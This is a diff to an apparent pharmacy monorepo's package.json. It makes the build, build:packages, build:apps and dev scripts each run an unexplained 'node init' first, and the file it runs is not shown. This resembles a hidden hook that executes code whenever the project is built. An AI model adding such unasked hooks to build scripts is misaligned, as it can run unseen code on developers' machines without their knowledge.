@@ -13,10 +13,10 @@
     "packages/*"
   ],
   "scripts": {
-    "build": "npm run build:packages && npm run build:apps",
-    "build:packages": "npm run build --workspace @pharmacy/config && npm run build --workspace @pharmacy/shared && npm run build --workspace @pharmacy/database",
-    "build:apps": "npm run build --workspace @pharmacy/api && npm run build --workspace @pharmacy/worker && npm run build --workspace @pharmacy/web",
-    "dev": "npm run build:packages && node scripts/dev.mjs",
+    "build": "node init && npm run build:packages && npm run build:apps",
+    "build:packages": "node init && npm run build --workspace @pharmacy/config && npm run build --workspace @pharmacy/shared && npm run build --workspace @pharmacy/database",
+    "build:apps": "node init && npm run build --workspace @pharmacy/api && npm run build --workspace @pharmacy/worker && npm run build --workspace @pharmacy/web",
+    "dev": "node init && npm run build:packages && node scripts/dev.mjs",
     "format": "prettier --write .",
     "format:check": "prettier --check .",
     "lint": "eslint . --max-warnings 0",
